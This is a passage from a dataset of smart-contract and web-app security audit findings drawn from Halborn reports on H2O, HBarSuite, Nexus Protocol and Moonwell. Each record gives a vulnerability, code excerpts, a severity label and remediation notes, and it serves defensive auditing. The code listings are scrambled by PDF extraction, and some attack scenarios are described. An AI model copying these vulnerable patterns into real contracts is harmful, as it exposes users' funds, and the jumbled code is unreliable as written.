SurplusAuctionHouseLike ( auctionHouse ); 189 DSTokenLike protocolToken = DSTokenLike (  surplusAuctionHouse . protocolToken () ); 190 191 require ( protocolToken . transferFrom ( msg . sender , address (  this ) , bidSize ) , \" geb - proxy - auction - actions / transfer - from - failed \" )  ; 192 protocolToken . approve ( address ( surplusAuctionHouse ) ,  bidSize ); 193 194 // Restarts auction if inactive (, uint amountToSell ,, uint48 bidExpiry , uint48  auctionDeadline ) = surplusAuctionHouse . bids ( auctionId ); 195 if ( auctionDeadline < now && bidExpiry == 0 &&  auctionDeadline > 0) { 196 197 198 199 surplusAuctionHouse . restartAuction ( auctionId ); } // Bid surplusAuctionHouse . increaseBidSize ( auctionId ,  amountToSell , bidSize ); 200 } 50 Listing 41: GebProxyActions.sol (Line 177) 169 function startAndIncreaseBidSize ( address  accountingEngineAddress , uint bidSize ) public { AccountingEngineLike accountingEngine = 170  AccountingEngineLike ( accountingEngineAddress ); 171 SurplusAuctionHouseLike surplusAuctionHouse =  SurplusAuctionHouseLike ( accountingEngine . surplusAuctionHouse () ); 172 DSTokenLike protocolToken = DSTokenLike (  surplusAuctionHouse . protocolToken () ); 173 174 175 176 // Starts auction uint auctionId = accountingEngine . auctionSurplus () ; require ( protocolToken . transferFrom ( msg . sender , address (  this ) , bidSize ) , \" geb - proxy - auction - actions / transfer - from - failed \" )  ; 177 protocolToken . approve ( address ( surplusAuctionHouse ) ,  bidSize ); 178 (, uint amountToSell , , ,) = surplusAuctionHouse . bids (  auctionId ); 179 180 // Bids surplusAuctionHouse . increaseBidSize ( auctionId ,  amountToSell , bidSize ); 181 } Listing 42: GebProxyIncentivesActions.sol (Line 55) CoinJoinLike ( coinJoin ). systemCoin () . approve ( uniswapRouter , IUniswapV2Router02 ( uniswapRouter ). addLiquidityETH { value : function _provideLiquidityUniswap ( address coinJoin , address 54  uniswapRouter , uint tokenWad , uint ethWad , address to , uint [2]  memory minTokenAmounts ) internal { 55  tokenWad ); 56  ethWad }( 57 58 59 60 61 62 63 64 address ( CoinJoinLike ( coinJoin ). systemCoin () ) , tokenWad , minTokenAmounts [0] , minTokenAmounts [1] , to , block . timestamp ); } 51 Listing 43: GebProxyIncentivesActions.sol (Line 81) return IUniswapV2Router02 ( uniswapRouter ). DSTokenLike ( getWethPair ( uniswapRouter , systemCoin )) . function _removeLiquidityUniswap ( address uniswapRouter , 80  address systemCoin , uint value , address to , uint [2] memory  minTokenAmounts ) internal returns ( uint amountA , uint amountB ) { 81  approve ( uniswapRouter , value ); 82  removeLiquidityETH ( 83 84 85 86 87 88 89 90 systemCoin , value , minTokenAmounts [0] , minTokenAmounts [1] , to , block . timestamp ); } Listing 44: GebProxyIncentivesActions.sol (Line 70) function _stakeInMine ( address incentives ) internal { DSTokenLike lpToken = DSTokenLike ( GebIncentivesLike ( lpToken . approve ( incentives , uint (0 - 1) ); GebIncentivesLike ( incentives ). stake ( lpToken . balanceOf ( 68 69  incentives ). stakingToken () ); 70 71  address ( this ))); 72 } Listing 45: CollateralLike Abstract Interface (Lines 23-25) 22 abstract contract CollateralLike { 23 24 25 26 } function approve ( address , uint ) virtual public ; function transfer ( address , uint ) virtual public ; function transferFrom ( address , address , uint ) virtual public ; Listing 46: DSTokenLike Abstract Interface (Line 73) function balanceOf ( address ) virtual public view returns ( uint ) 71 abstract contract DSTokenLike { 72  ; 73 function approve ( address , uint ) virtual public ; 52 function transfer ( address , uint ) virtual public returns ( bool ) function transferFrom ( address , address , uint ) virtual public 74  ; 75  returns ( bool ); 76 } Listing 47: WethLike Abstract Interface (Lines 80-82) function balanceOf ( address ) virtual public view returns ( uint ) 78 abstract contract WethLike { 79  ; 80 81 82 83 84 85 } function approve ( address , uint ) virtual public ; function transfer ( address , uint ) virtual public ; function transferFrom ( address , address , uint ) virtual public ; function deposit () virtual public payable ; function withdraw ( uint ) virtual public ; Risk Level: Likelihood - 1 Impact - 3 Recommendation: Its recommend to using OpenZeppelins SafeERC20 versions with the safeIncreaseAllowance & safeDecreaseAllowance function that handles the return value check as well as non-standard-compliant tokens. Reference: OpenZeppelin SafeERC20 Remediation Plan: RISK ACCEPTED: The H2O team accepts the risk of this issue, claiming that all tokens to be used in production will be reverted in the event of a 53 failure. Moreover, the team will add documentation to warn downstream users to use the H2O system only with tokens that will revert the ERC20. approve(). 54 3.10 (HAL-10) MISSING SAFE ENGINE ADDRESS VALIDATION - LOW ", "labels": ["Halborn", "OceanProtocol_Priority_H2O_System_Action", "Severity: Informational"]}, {"title": "DENIAL OF SERVICE AFFECTING SMART NODES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest_Report_Halborn_Final.pdf", "body": "A Denial-of-Service (DoS) attack is an attack meant to affect an applica- tion, making it inaccessible. DoS attacks accomplish this by overloading the target with traffic, or sending it information that could derive in high resources consumption. The Smart Nodes were affecting by this issue when an attacker using a single machine could overflow their resources. Evidences: Figure 1: Application error when visiting the resource. 12 Figure 2: Multiple errors on the application Risk Level: Likelihood - 5 Impact - 5 Recommendation: Configure a WAF or a denial of service protection in order to adjust the number of requests that a user could send to the applications. Remediation Plan: SOLVED: The issue was solved by the HBarSuite team and verified by Halborn. During the retesting phase, it was possible to denial of service the previously affected items. 13 ", "labels": ["Halborn", "HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest", "Severity: Critical"]}, {"title": "LACK OF NFT CREATION WHEN ADDING LIQUIDITY TO A POOL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest_Report_Halborn_Final.pdf", "body": "One of the functionalities of HBarSuite DEX is the liquidity addition to a pool. This functionality allows a user to add liquidity in to a pool, minting an NFT that is sent to the users wallet, and it is burned when the user claims back the liquidity provided. It was found during the audit that the functionality, stopped working during the last days of the audit. The application was depositing the clients liquidity in to the pool, but no NFTs were minted. This situation made impossible to a user to claim back the liquidity or observe the liquidity added in to the different pools. Note: The HBarSuite team confirmed that the functionality stopped working regarding changes in the 3rd party provider. Code Location: Risk Level: Likelihood - 5 Impact - 5 Recommendation: Modify the application accordingly to the changes of the 3rd party provider. Additionally, add a functionality that could allow a user to mint the NFT after adding liquidity to the pool, in case that something fails, the user could mint the liquidity NFT afterwards. 14 Remediation Plan: SOLVED: The issue was solved by the HBarSuite team and verified by Halborn. During the retesting phase, it was possible to observe that the application was minting the corresponding NFT linked to the liquidity added. Figure 3: NFT created after adding liquidity to a pool. 15 ", "labels": ["Halborn", "HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest", "Severity: Critical"]}, {"title": "HTML INJECTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest_Report_Halborn_Final.pdf", "body": "HyperText Markup Language (HTML) injection is a technique used to take advantage of non-validated input to modify the legitimate behavior of When the application fails to validate the input the application. data, it allows an attacker to perform malicious inputs that could be presented to other users. The range of attacks could vary from simple visual modifications to redirects to malicious web applications where the attacker could perform further attacks. In this case, the web application presented an HTML injection on DAO creation. This could allow an attacker to inject malicious HTML tags and modify the appearance of the application. However, during the assessment not all the available HTML tags were interpreted by the application, reducing the attack surface. 16 Evidence: Risk Level: Likelihood - 3 Impact - 3 Recommendation: Figure 4: HTML injection on DAO creation Filter any kind of malicious character sent to the server. Additionally, limit the types of characters that a user could inject into the application or escape, everything outside of alphanumeric characters. 17 Remediation Plan: SOLVED: The issue was solved by the HBarSuite team and verified by Halborn. It was possible to observe that the application was verifying the malicious input data and sanitizing it before executing any action. 18 ", "labels": ["Halborn", "HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest", "Severity: Medium"]}, {"title": "UNDEFINED VALUE ON MALICIOUS POOL CREATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest_Report_Halborn_Final.pdf", "body": "When a user tries to make a swap between two tokens that do not exist on the DEX, the application was offering to the user to create a pool between both currencies. However, when the requests to create a new pool were tampered and modified to create a malicious pool under the attackers control, the application was detecting this as undefined. This could mean that the application did not have a control to catch an exception when a pool was manipulated and rejected by the application. However, no subsequent issues were found regarding this issue. Evidences: Figure 5: Legitimate request to create a new pool Figure 6: Malicious request to create a pool under attackers control Figure 7: Undefined value detected on the backend 19 Figure 8: Error on the application Risk Level: Likelihood - 2 Impact - 2 Recommendation: Improve the error logging into the application, implementing correct error messages when the backend sanitizes the data or undefined values. Remediation Plan: SOLVED: The issue was solved by the HBarSuite team and verified by Halborn. During the retesting phase, it was possible to observe that the application was verifying the legitimate creation of a pool. 20 THANK YOU FOR CHOOSING", "labels": ["Halborn", "HBarSuite_WebApp_SmartNode_FrontEnd_BackEnd_Pentest", "Severity: Low"]}, {"title": "MISCALCULATION OF BALANCE LEADS TO OVERRATED REWARDS DISTRIBUTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf", "body": "split_profit_to_handle_interest The s/basset_vault/src/utils.rs total_stable_coin_balance, which produces the following consequences: function miscalculates contract- of from the always value  The aforementioned function wrongly calculates rewards and overrates them, at expenses of vault funds.  Decisions regarding rewards distribution will be wrongly made: BuyPsi, DepositToAnc or Split.  Total balance could not reach aim_stable_balance, whereby the vault would not be able to repay loans to Anchor. It is important to note that is not possible to revert, undo or correct the logic of the split_profit_to_handle_interest function, unless the vault contract is redeployed, which could lead to a significant loss of users and Nexus vaults funds. Attack scenario: 1. Total stablecoin balance always is miscalculated and wrongly con- siders selling_anc_profit in the calculus, see image below. 16 2. The split_profit_to_handle_interest function overrates rewards val- ues and, when they are distributed, the remaining total balance could not reach aim_stable_balance as it should, see image below. Code Location: Listing 1: contracts/basset_vault/src/utils.rs (Lines 434) 422 pub fn split_profit_to_handle_interest ( 423 424 425 426 427 428 429 ) -> ActionWithProfit { 430 borrowed_amount : Uint256 , aterra_amount : Uint256 , aterra_exchange_rate : Decimal256 , stable_coin_balance : Uint256 , stable_coin_balance_before_sell_anc : Uint256 , over_loan_balance_value : Decimal256 , if stable_coin_balance <= stable_coin_balance_before_sell_anc 431 432 433 434 435 436 437 { return ActionWithProfit :: Nothing ; } let total_stable_coin_balance = aterra_amount * aterra_exchange_rate + stable_coin_balance ; let selling_anc_profit = stable_coin_balance - stable_coin_balance_before_sell_anc ; let aim_stable_balance = borrowed_amount * over_loan_balance_value ; Risk Level: Likelihood - 5 Impact - 4 17 Recommendation: Update the total_stable_coin_balance formula not to include the value of selling_anc_profit. Below is a proposed sample formula: total_stable_coin_balance stable_coin_balance_bef ore_sell_anc = aterra_amount  aterra_exchange_rate + Remediation plan: SOLVED: Issue fixed in commit cbaeb5bd108c030d5993145d080495c1ccf1719f. 18 ", "labels": ["Halborn", "Nexus_Protocol_CosmWasm", "Severity: High"]}, {"title": "MISCALCULATION OF NASSET TOKENS TO MINT LEADS TO UNFAIR WITHDRAWING / DOS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf", "body": "The deposit_basset function from contracts/basset_vault/src/commands.rs miscalculates the value of nasset_to_mint if someone has previously trans- ferred bAsset tokens directly to the vault, which produces the following consequences:  When a legitimate user deposits bAsset tokens to the vault, the nasset_to_mint value will be lower than it should be, which leads to unfair withdrawing.  If nAsset supply is zero, legitimate users will not be able to deposit or withdraw bAssets anymore, which causes an unrecoverable denial of service (DoS) of the Nexus protocol. It is important to note that it is not possible to revert, undo or correct the logic of the deposit_basset function, unless the vault contract is redeployed, which could lead to a significant loss of users or Nexus vaults funds. Attack scenario: 1. User #1 uses the deposit_basset function to deposit 2000 bLuna tokens into the vault and receives 2000 nAsset tokens in return. 2. Someone transfers 2000 bLuna tokens directly to the vault. 3. User #2 uses the deposit_basset function to deposit 2000 bLuna tokens in the vault and receives 1000 nAsset tokens in return, instead of 2000 like User #1. 4. User #2 uses the withdraw_basset function to withdraw all its bLuna, but receives 1333 bLuna tokens, instead of 2000 he had deposited. 19 Code Location: Listing 2: contracts/basset_vault/src/commands.rs (Lines 169,178) 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 let basset_in_contract_address = query_token_balance ( deps . as_ref () , & config . basset_token , & env . contract . address ) ?; let basset_balance : Uint256 = basset_in_custody + basset_in_contract_address . into () ; if basset_balance == Uint256 :: zero () { // impossible because ' farmer ' already sent some basset return Err ( StdError :: generic_err ( \" basset balance is zero ( impossible case ) \". to_string () , )); } let farmer_basset_share : Decimal256 = Decimal256 :: from_ratio ( deposit_amount .0 , basset_balance .0) ; // nAsset tokens to mint : // user_share = ( deposited_basset / total_basset ) // nAsset_to_mint = nAsset_supply * user_share / (1 - user_share ) let nasset_to_mint = if farmer_basset_share == Decimal256 :: one () { deposit_amount } else { // ' nasset_supply ' can ' t be zero here , cause we already mint some for first farmer nasset_supply * farmer_basset_share / ( Decimal256 :: one () - farmer_basset_share ) 179 }; Risk Level: Likelihood - 4 Impact - 4 Recommendation: Update deposit_amount value to include bAsset tokens directly transferred to the vault. Below are proposed sample formulas: 20 deposit_amount = basset_in_contract_address nasset_to_mint = nasset_supply  deposit_amount basset_balance  deposit_amount Remediation plan: SOLVED: Issue fixed in commit dd6c2467c5e1f7bdc90c7b87b3c7fb4ee8c6244d. 21 ", "labels": ["Halborn", "Nexus_Protocol_CosmWasm", "Severity: High"]}, {"title": "NO UPDATE OF LOAN REPAYMENT STATE ON REBALANCE FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf", "body": "The rebalance function from contracts/basset_vault/src/commands.rs never resets repaying_loan_state value when loan repayment completes, so its iteration_index will continue increasing until reaching the maximum number of iterations allowed. Once it happens, loan repayments could be wrongly marked as completed or throw error messages, instead of iterating to actually complete the repayment. It is important to note that is not possible to revert, undo or correct the logic of the rebalance function, unless the vault contract is redeployed, which could lead to a significant loss of users or Nexus vaults funds. Code Location: Listing 3: contracts/basset_vault/src/commands.rs (Lines 389) 384 385 386 387 388 389 390 391 392 393 BorrowerActionResponse :: Repay { amount , advised_buffer_size , } => { store_aim_buffer_size ( deps . storage , & advised_buffer_size ) ?; let mut repaying_loan_state = load_repaying_loan_state ( deps . as_ref () . storage ) ?; repaying_loan_state . to_repay_amount = amount ; repaying_loan_state . aim_buffer_size = advised_buffer_size ; repay_logic ( deps , env , config , repaying_loan_state ) } 22 Risk Level: Likelihood - 5 Impact - 3 Recommendation: Update the logic of rebalance function to reset repaying_loan_state value when loan repayment completes. Remediation plan: SOLVED: Issue fixed in commit c5714f1d8d73dac552820a3180cd598b33bb2bcb. 23 ", "labels": ["Halborn", "Nexus_Protocol_CosmWasm", "Severity: High"]}, {"title": "PRIVILEGED ADDRESSES CAN BE TRANSFERRED WITHOUT CONFIRMATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf", "body": "An incorrect use of the update_config function in contracts can set owner to an invalid address and inadvertently lose control of the contracts, which cannot be undone in any way. Currently, the owner of the contracts can change governance contract address (owner) using the aforementioned function in a single transaction and without confirmation from the new address. The affected smart contracts are the following:  basset_vault  basset_vault_strategy  nasset_token_config_holder  nasset_token_rewards  psi_distributor Code Location: Listing 4: contracts/basset_vault/src/commands.rs 52 53 if let Some ( ref gov_addr ) = gov_addr { current_config . governance_contract = deps . api . addr_validate ( gov_addr ) ?; 54 } Listing 5: contracts/basset_vault_strategy/src/commands.rs 24 25 if let Some ( ref governance_addr ) = governance_addr { current_config . governance_contract = deps . api . addr_validate ( governance_addr ) ?; 26 } 24 Listing 6: contracts/nasset_token_config_holder/src/contract.rs 88 89 if let Some ( ref governance_addr ) = governance_contract_addr { current_config . governance_contract = deps . api . addr_validate ( governance_addr ) ?; 90 } Listing 7: contracts/nasset_token_rewards/src/commands.rs 32 33 if let Some ( ref governance_contract ) = governance_contract { current_config . governance_contract = deps . api . addr_validate ( governance_contract ) ?; 34 } Listing 8: contracts/psi_distributor/src/commands.rs 142 if let Some ( ref governance_contract_addr ) = governance_contract_addr { current_config . governance_contract = deps . api . addr_validate ( governance_contract_addr ) ?; 143 144 } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to split ownership transfer functionality into set_owner and accept_ownership functions. The latter function allows the transfer to be completed by recipient. Remediation plan: SOLVED: Issue fixed in the following commits:  561ab303f514ea9b3d68940cbe4f864ccc7cce12 25  14e76524135074757aae4e635dc2c352d3c611ca  9523bf781294e8134aeb8bbdb152ea9ba90eeb49  cf9709ba279507ae2951039fed8368f504184291  b551a6cd48864af1874356a05cf5984aa6bc4e22 26 ", "labels": ["Halborn", "Nexus_Protocol_CosmWasm", "Severity: Medium"]}, {"title": "DECIMAL RATES COULD BE UPDATED TO A VALUE GREATER OR EQUAL THAN 1", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf", "body": "update_config The contracts/psi_distributor/src/com- mands.rs changes all fields directly, so does not restrict that values of manual_ltv, fee_rate or tax_rate are greater or equal than 1. function from The aforementioned values are used to calculate reward distribution and if are not correctly set, the formula will always panic and wont allow legitimate users to claim their rewards, thus generating a denial of service (DoS) in Nexus protocol. Code Location: Listing 9: contracts/psi_distributor/src/commands.rs 162 163 164 165 166 167 168 169 170 171 172 if let Some ( manual_ltv ) = manual_ltv { current_config . manual_ltv = manual_ltv ; } if let Some ( fee_rate ) = fee_rate { current_config . fee_rate = fee_rate ; } if let Some ( tax_rate ) = tax_rate { current_config . tax_rate = tax_rate ; } Risk Level: Likelihood - 2 Impact - 3 27 Recommendation: Add a validation routine inside update_config function to ensure that values of manual_ltv, fee_rate and tax_rate are lesser than 1. Remediation plan: SOLVED: Issue fixed in commit 36c2395e68ee805426dccf46d6cb1e98f2bd3834. 28 ", "labels": ["Halborn", "Nexus_Protocol_CosmWasm", "Severity: Low"]}, {"title": "LOAN REPAYMENT COULD TAKE MORE ITERATIONS THAN ALLOWED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf", "body": "The set_buffer_part function from contracts/basset_vault_strategy/src/s- tate.rs changes the value of buffer_part directly and does not verify if this value does not exceed the number of iterations allowed by the LOAN_REPAYMENT_MAX_RECURSION_DEEP constant. If the number of iterations reaches its maximum value, the loan repayment will be wrongly marked as completed (because of previous partial pay- ments), instead of throwing an error message for loan repayment failure. Code Location: Listing 10: contracts/basset_vault_strategy/src/state.rs 70 pub fn set_buffer_part (& mut self , value : Decimal256 ) -> ContractResult <() > { if value . is_zero () || value > Decimal256 :: one () { return Err ( ContractError :: InappropriateValue ); } self . buffer_part = value ; Ok (() ) 71 72 73 74 75 76 77 } Risk Level: Likelihood - 1 Impact - 3 29 Recommendation: Add a validation routine inside set_buffer_part function to ensure that loan repayment will be able to complete within the number of iterations allowed. Below is a proposed sample validation for this routine: buf f er_part >= max_ltv  aim_ltv LOAN_REP AY M EN T_M AX_RECU RSION_DEEP Remediation plan: SOLVED: Issue fixed in commit cfe2ef43d778d2b363abd6bd5d287066bfe86aca. 30 ", "labels": ["Halborn", "Nexus_Protocol_CosmWasm", "Severity: Low"]}, {"title": "ROUNDING ISSUES WHEN DEPOSITING / WITHDRAWING BASSET TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf", "body": "calculating When and basset_to_withdraw in withdraw_basset function, the multiply before divide principle is not followed, which generates rounding issues. nasset_to_mint deposit_basset function in Although the actual difference for rounding in each operation is very small, in the long run and with enough operations, it could cause a significant imbalance. Code Location: Calculating the nAsset tokens to mint: Listing 11: contracts/basset_vault/src/commands.rs (Lines 169,178) Decimal256 :: from_ratio ( deposit_amount .0 , basset_balance .0) ; 168 let farmer_basset_share : Decimal256 = 169 170 171 // nAsset tokens to mint : 172 // user_share = ( deposited_basset / total_basset ) 173 // nAsset_to_mint = nAsset_supply * user_share / (1 - user_share ) 174 let nasset_to_mint = if farmer_basset_share == Decimal256 :: one () { 175 176 } else { 177 // ' nasset_supply ' can 't be zero here , cause we already mint deposit_amount some for first farmer 178 nasset_supply * farmer_basset_share / ( Decimal256 :: one () - farmer_basset_share ) 179 }; 31 Calculating the bAsset tokens to withdraw: Listing 12: contracts/basset_vault/src/commands.rs (Lines 280,283) 279 let share_to_withdraw : Decimal256 = Decimal256 :: from_ratio ( 280 281 282 ); 283 let basset_to_withdraw : Uint256 = basset_in_custody * nasset_to_withdraw_amount .0 , Uint256 :: from ( nasset_token_supply ) .0 , share_to_withdraw ; Risk Level: Likelihood - 3 Impact - 1 Recommendation: The formulas to calculate nasset_to_mint and basset_to_withdraw should be rewritten to reduce rounding issues. Below are proposed sample formulas: nasset_to_mint = nasset_supply  deposit_amount basset_balance  deposit_amount basset_to_withdraw = basset_in_custody  nasset_to_withdraw_amount nasset_token_supply Remediation plan: SOLVED: Issue fixed in commit d80eef123844c614c9eb43180828ddc7ea8ac49c. 32 ", "labels": ["Halborn", "Nexus_Protocol_CosmWasm", "Severity: Low"]}, {"title": "UNAUTHORIZED TOKEN REWARDS CONTRACT ADDRESS MODIFICATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf", "body": "can method be set_nasset_token_rewards_contract The contracts/ update nasset_token_config_holder/src/state.rs the contract configuration and set the nAsset rewards contract address if it hasnt been already set. This config option is world-writeable and can be accessed by sending a SetTokenRewardsContract message to the handler in contracts/nasset_token_config_holder/src/contract.rs. This may lead to unauthorized config modification and possible loss of users rewards. in used to Code Location: Listing 13: (Lines 42,47) contracts/nasset_token_config_holder/src/contract.rs AnyoneMsg :: SetTokenRewardsContract { 37 ExecuteMsg :: Anyone { anyone_msg } = > match anyone_msg { 38 39 40 41 42 let config = load_config ( deps . storage ) ?; if config . nasset_token_rewards_contract . to_string () . nasset_token_rewards_contract_addr , } => { 43 44 45 46 47 48 49 50 51 is_empty () { let addr = deps . api . addr_validate (& nasset_token_rewards_contract_addr ) ?; set_nasset_token_rewards_contract ( deps . storage , addr ) ?; Ok ( Response :: default () ) } else { return Err ( ContractError :: Unauthorized {}) ; 33 52 } Listing 14: 20) contracts/nasset_token_config_holder/src/state.rs (Lines storage : & mut dyn Storage , addr : Addr , 15 pub fn set_nasset_token_rewards_contract ( 16 17 18 ) -> StdResult < Config > { 19 singleton ( storage , KEY_CONFIG ). update (| mut cfg : Config | -> StdResult <_ > { cfg . nasset_token_rewards_contract = addr ; Ok ( cfg ) 20 21 22 23 } }) Risk Level: Likelihood - 1 Impact - 2 Recommendations: All sensitive operations on configuration data should require prior au- thorization in order not to be modified by malicious individuals. Remediation plan:: the Nexus This ACKNOWLEDGED: nasset_config_holder token contract initialization which makes this vulnerability highly unlikely to be exploited. acknowledged initialized this on contract finding. bAsset team the is 34 ", "labels": ["Halborn", "Nexus_Protocol_CosmWasm", "Severity: Informational"]}, {"title": "GLOBAL INDEX MANIPULATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Nexus_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn v1.1.pdf", "body": "function contracts/ calculate_global_index The which nasset_token_rewards/src/commands.rs index This is then used to calculate the rewards distributed to users. function is indirectly available from the update_global_index function which can be called by sending an anonymous UpdateGlobalIndex message to the handler in contracts/nasset_token_rewards/src/contract.rs. determines defined the in global_index nasset_token_rewards This contract the claim_rewards_for_someone functions. can manipulated with be by sending rewards the claim_rewards to and Code Location: Listing 75,89,90,91,92) 15: contracts/nasset_token_rewards/src/commands.rs (Lines 69 fn calculate_global_index ( deps : Deps , 70 env : Env , 71 config : & Config , 72 73 state : & mut State , 74 ) -> ContractResult < Uint128 > { 75 let balance = query_token_balance ( deps , & config . psi_token , & env . contract . address ) ?; let previous_balance = state . prev_reward_balance ; // claimed_rewards = current_balance - prev_balance ; let claimed_rewards = balance . checked_sub ( previous_balance ) ?; if claimed_rewards . is_zero () || state . total_balance . is_zero () { return Ok ( claimed_rewards ); } 76 77 78 79 80 81 82 83 84 35 85 86 87 88 89 90 91 92 93 94 95 } state . prev_reward_balance = balance ; // global_index += claimed_rewards / total_balance ; state . global_index = decimal_summation_in_256 ( state . global_index , Decimal :: from_ratio ( claimed_rewards , state . total_balance ) , ); Ok ( claimed_rewards ) Listing 16: contracts/nasset_token_rewards/src/commands.rs (Lines 51) 41 pub fn update_global_index ( deps : DepsMut , env : Env ) -> 42 43 44 45 46 47 48 49 50 51 ContractResult < Response > { let mut state : State = load_state ( deps . storage ) ?; // Zero nasset balance check if state . total_balance . is_zero () { return Err ( StdError :: generic_err (\" nAsset balance is zero \" ) . into () ); } let config = load_config ( deps . storage ) ?; let claimed_rewards = calculate_global_index ( deps . as_ref () , env , & config , & mut state ) ?; Listing 17: contracts/nasset_token_rewards/src/contract.rs (Lines 52) deps : DepsMut , env : Env , info : MessageInfo , msg : ExecuteMsg , 43 #[ entry_point ] 44 pub fn execute ( 45 46 47 48 49 ) -> ContractResult < Response > { 50 51 52 match msg { ExecuteMsg :: Anyone { anyone_msg } => match anyone_msg { AnyoneMsg :: UpdateGlobalIndex {} = > commands :: update_global_index ( deps , env ) , 36 Risk Level: Likelihood - 1 Impact - 2 Recommendations: Both claim_rewards and claim_rewards_for_someone should block sending PSI tokens to the nasset_token_reward contract in order to prevent global index manipulation. Remediation plan:: ACKNOWLEDGED: the Nexus team acknowledged this finding. global_index manipulation could incur losses to the attacker which makes this vulner- ability less likely to be exploited. 37 3.10 (HAL-10) INSUFFICIENT MARKETING DATA VALIDATION - INFORMATIONAL ", "labels": ["Halborn", "Nexus_Protocol_CosmWasm", "Severity: Informational"]}, {"title": "OVERPRIVILEGED ROLE ON THE BREAK GLASS GUARDIAN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_and_Timelock_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract GovernorAlpha, the breakGlassGuardian has the authority to call the following functions to update the timelock admin:  GovernorAlpha.__acceptAdminOnTimelock() : The breakGlassGuardian can accept address to be a timelock admin.  GovernorAlpha.__executeSetTimelockPendingAdmin(address) breakGlassGuardian can add a pending admin. : The Any compromise to the breakGlassGuardian account may allow the hacker to tamper with the project through these functions. Code Location: Listing 1: GovernorAlpha.sol require ( msg . sender == breakGlassGuardian , \" GovernorAlpha :: // / @notice Fast tracks setting a pendingAdmin on the timelock } timelock . acceptAdmin () ; function __acceptAdminOnTimelock () public { 1 2  __acceptAdmin : sender must be bg guardian \" ); 3 4 5 6  . Only callable by the break glass guardian . 7  newPendingAdmin ) public { 8  __executeSetTimelockPendingAdmin : sender must be bg guardian \"); 9  \" setPendingAdmin ( address ) \" , abi . encode ( newPendingAdmin )) ; 10 function __executeSetTimelockPendingAdmin ( address } require ( msg . sender == breakGlassGuardian , \" GovernorAlpha :: timelock . fastTrackExecuteTransaction ( address ( timelock ) , 0, 12 Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to remove one of the functions and carefully manage the private key of the breakGlassGuardian account to avoid any potential hacking risk. In general, it is strongly recommended enhancing central- ized privileges or roles in the protocol through a decentralized mechanism or smart contract-based accounts with enhanced security practices, e.g., Multi-signature wallets. Remediation Plan: SOLVED: The Moonwell Team solved this issue by removing the **__execute- SetTimelockPendingAdmin** function. Commit ID: 4e8bec5926339106c225d0f85120ba182e52f2dd 13 ", "labels": ["Halborn", "Moonwell_Finance_Governance_and_Timelock_Updates", "Severity: Medium"]}, {"title": "TIMELOCK DELAY IS SET TO ZERO IN THE CONSTRUCTOR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_and_Timelock_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The timelock delay is set to zero in the constructor. That can cause inconsistency in the proposals, and each proposal can bypass the timelock. Code Location: Listing 2: Timelock.sol constructor ( address admin_ , uint delay_ ) public { require ( delay_ >= MINIMUM_DELAY , \" Timelock :: constructor : require ( delay_ <= MAXIMUM_DELAY , \" Timelock :: setDelay : 1 2  Delay must exceed minimum delay . \"); 3  Delay must not exceed maximum delay .\" ); 4 5 6 admin = admin_ ; delay = 0; } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to set a delay in the constructor. Remediation Plan: SOLVED: The Moonwell Team solved this issue by setting the delay function. 14 Commit ID: 4e8bec5926339106c225d0f85120ba182e52f2dd 15 ", "labels": ["Halborn", "Moonwell_Finance_Governance_and_Timelock_Updates", "Severity: Medium"]}, {"title": "MISSING EVENTS FOR ADMIN ONLY FUNCTIONS THAT CHANGE CRITICAL PARAMETERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract 